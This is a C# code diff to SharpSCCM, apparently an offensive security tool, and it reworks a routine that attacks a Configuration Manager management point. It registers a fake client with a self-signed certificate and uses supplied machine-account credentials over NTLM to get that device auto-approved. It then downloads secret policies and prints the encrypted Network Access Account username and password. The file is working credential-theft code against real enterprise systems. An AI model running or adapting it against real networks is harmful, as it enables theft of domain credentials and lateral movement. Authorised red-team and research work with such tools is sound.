@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Net;
 using System.Security.Cryptography;
 using System.Security.Cryptography.X509Certificates;
 using System.Xml;
@@ -12,6 +13,14 @@ namespace SharpSCCM
 {
     static class MgmtPointMessaging
     {
+        static MessageCertificateX509 CreateCertificate()
+        {
+            // Generate certificate for signing and encrypting messages
+            string[] oidPurposes = new string[] { "2.5.29.37" }; // Any extended key usage
+            MessageCertificateX509 certificate = MessageCertificateX509.CreateSelfSignedCertificate("ConfigMgr Client Signing and Encryption", "ConfigMgr Client Signing and Encryption", oidPurposes, DateTime.Now, DateTime.Now.AddMonths(6));
+            return certificate;
+        }
+
         public static MessageCertificateX509Volatile CreateUserCertificate()
         {
             // Generate certificate for signing and encrypting messages
@@ -34,29 +43,25 @@ namespace SharpSCCM
             return certificate;
         }
 
-        public static void GetNetworkAccessAccounts(string server, string sitecode)
+        public static void GetNetworkAccessAccounts(string server, string sitecode, string method, string machine = null, string password = null)
         {
             // HTTP sender is used for sending messages to the MP
             HttpSender sender = new HttpSender();
 
-            // Get certificates from local machine
-            MessageCertificateX509 signingCertificate = GetSigningCertificate();
-            MessageCertificateX509 encryptionCertificate = GetEncryptionCertificate();
-            //MessageCertificateX509 certificate = CreateUserCertificate();
-
-            // Register a new client. Using existing client does not work, likely because the certificate does not match what the server expects
-            //SmsClientId clientId = RegisterClient(certificate, null, server, sitecode);
+            // Register a new client
+            // Use NTLM authentication for the specified machine account to automatically approve the new device record, allowing secret policy retrieval
+            MessageCertificateX509 certificate = CreateUserCertificate();
+            string authenticationType = "Windows";
+            SmsClientId clientId = RegisterClient(certificate, null, server, sitecode, authenticationType, machine, password);
             //SendDDR(certificate, null, server, sitecode, clientId);
 
             // Send request for policy assignments to obtain policy locations
             ConfigMgrPolicyAssignmentRequest assignmentRequest = new ConfigMgrPolicyAssignmentRequest();
 
             // Add our certificate for message signing and encryption
-            assignmentRequest.AddCertificateToMessage(signingCertificate, CertificatePurposes.Signing);
-            assignmentRequest.AddCertificateToMessage(encryptionCertificate, CertificatePurposes.Encryption);
-            //assignmentRequest.AddCertificateToMessage(certificate, CertificatePurposes.Signing | CertificatePurposes.Encryption);
+            assignmentRequest.AddCertificateToMessage(certificate, CertificatePurposes.Signing | CertificatePurposes.Encryption);
 
-            SmsClientId clientId = ClientWmi.GetSmsId();
+            // Configure message settings
             assignmentRequest.SmsId = clientId;
             assignmentRequest.Settings.HostName = server;
             assignmentRequest.Settings.Compression = MessageCompression.Zlib;
@@ -64,19 +69,17 @@ namespace SharpSCCM
             assignmentRequest.SiteCode = sitecode;
             assignmentRequest.SerializeMessageBody();
             Console.WriteLine($"[+] Obtaining {assignmentRequest.RequestType} {assignmentRequest.ResourceType} policy assignment from {assignmentRequest.Settings.HostName} {assignmentRequest.SiteCode}");
-            Console.WriteLine($"\n[+] Policy assignment request body:\n{System.Xml.Linq.XElement.Parse("<root>" + assignmentRequest.Body + "</root>")}");
+            //Console.WriteLine($"\n[+] Policy assignment request body:\n{System.Xml.Linq.XElement.Parse("<root>" + assignmentRequest.Body + "</root>")}");
             ConfigMgrPolicyAssignmentReply assignmentReply = assignmentRequest.SendMessage(sender);
-            Console.WriteLine($"\n[+] Policy assignment reply body:\n {assignmentReply.Body}");
+            //Console.WriteLine($"\n[+] Policy assignment reply body:\n {assignmentReply.Body}");
 
             // Send request to download the body of the assigned policies
             ConfigMgrPolicyBodyDownloadRequest policyDownloadRequest = new ConfigMgrPolicyBodyDownloadRequest(assignmentReply);
 
             // Add our certificate for message signing and encryption
-            policyDownloadRequest.AddCertificateToMessage(signingCertificate, CertificatePurposes.Signing);
-            policyDownloadRequest.AddCertificateToMessage(encryptionCertificate, CertificatePurposes.Encryption);
-            //policyDownloadRequest.AddCertificateToMessage(certificate, CertificatePurposes.Signing | CertificatePurposes.Encryption);
+            policyDownloadRequest.AddCertificateToMessage(certificate, CertificatePurposes.Signing | CertificatePurposes.Encryption);
 
-            // Discover local properties
+            // Discover local properties and configure message settings
             policyDownloadRequest.Discover();
             policyDownloadRequest.SmsId = clientId;
             policyDownloadRequest.DownloadSecrets = true;
@@ -84,7 +87,9 @@ namespace SharpSCCM
             policyDownloadRequest.Settings.Compression = MessageCompression.Zlib;
             policyDownloadRequest.Settings.ReplyCompression = MessageCompression.Zlib;
             policyDownloadRequest.SiteCode = sitecode;
+            policyDownloadRequest.ForceSmsIdSignature = true;
             policyDownloadRequest.SerializeMessageBody();
+            System.Threading.Thread.Sleep(10000);
             Console.WriteLine($"[+] Sending policy download request to {policyDownloadRequest.Settings.HostName}:{policyDownloadRequest.SiteCode}");
             //Console.WriteLine($"[+] Policy request body:\n{System.Xml.Linq.XElement.Parse("<root>" + policyDownloadRequest.Body + "</root>")}");
             //foreach (var attachment in policyDownloadRequest.Attachments)
@@ -104,25 +109,6 @@ namespace SharpSCCM
                     string encryptedPassword = policyXmlDoc.SelectSingleNode("//instance").FirstChild.NextSibling.NextSibling.InnerText;
                     Console.WriteLine($"\n[+] Encrypted NetworkAccessUsername: {encryptedUsername}");
                     Console.WriteLine($"\n[+] Encrypted NetworkAccessPassword: {encryptedPassword}");
-                    /*
-                    // Request MP certificates
-                    ConfigMgrMPCertRequest certRequest = new ConfigMgrMPCertRequest();
-                    certRequest.AddCertificateToMessage(signingCertificate, CertificatePurposes.Signing);
-                    certRequest.AddCertificateToMessage(encryptionCertificate, CertificatePurposes.Encryption);
-                    certRequest.SmsId = clientId;
-                    certRequest.Settings.HostName = server;
-                    certRequest.Settings.Compression = MessageCompression.Zlib;
-                    certRequest.Settings.ReplyCompression = MessageCompression.Zlib;
-                    certRequest.SiteCode = sitecode;
-                    certRequest.SerializeMessageBody();
-                    Console.WriteLine($"\n[+] Requesting management point certificate for data decryption");
-                    ConfigMgrMPCertReply certReply = certRequest.SendMessage(sender);
-                    Console.WriteLine(certReply.MPCertificate.Certificate.PublicKey);
-                    MessageCertificateX509Volatile certReplyCert = new MessageCertificateX509Volatile(certReply.MPCertificate.Certificate);
-                    */
-                    //Console.WriteLine($"\n[+] Decrypted NetworkAccessUsername: {ByteArrayToString(encryptionCertificate.Decrypt(StringToByteArray(encryptedUsername)))}");
-                    //Console.WriteLine($"\n[+] Decrypted NetworkAccessPassword: {ByteArrayToString(encryptionCertificate.Decrypt(StringToByteArray(encryptedPassword)))}");
-                    //Console.WriteLine($"\n[+] Decrypted NetworkAccessUsername: {ByteArrayToString(certificate.Decrypt(StringToByteArray(encryptedUsername)))}");
                 }
             }
         }
@@ -134,7 +120,7 @@ namespace SharpSCCM
             return certificate;
         }
 
-        public static SmsClientId RegisterClient(MessageCertificateX509 certificate, string target, string managementPoint, string siteCode)
+        public static SmsClientId RegisterClient(MessageCertificateX509 certificate, string target, string managementPoint, string siteCode, string authenticationType = null, string machine = null, string password = null)
         {
             // HTTP sender is used for sending messages to the MP
             HttpSender sender = new HttpSender();
@@ -163,6 +149,15 @@ namespace SharpSCCM
             registrationRequest.Settings.Compression = MessageCompression.Zlib;
             registrationRequest.Settings.ReplyCompression = MessageCompression.Zlib;
             registrationRequest.SiteCode = siteCode;
+            if (authenticationType == "Windows")
+            {
+                registrationRequest.Settings.Security.AuthenticationType = AuthenticationType.WindowsAuth;
+                if (!string.IsNullOrEmpty(machine) && !string.IsNullOrEmpty(password))
+                {
+                    Console.WriteLine($"  Using machine account: {machine}");
+                    registrationRequest.Settings.Security.Credentials = new NetworkCredential(machine, password);
+                }
+            }
             Console.WriteLine($"  SiteCode: {registrationRequest.SiteCode}");
 
             // Serialize message XML and display to user
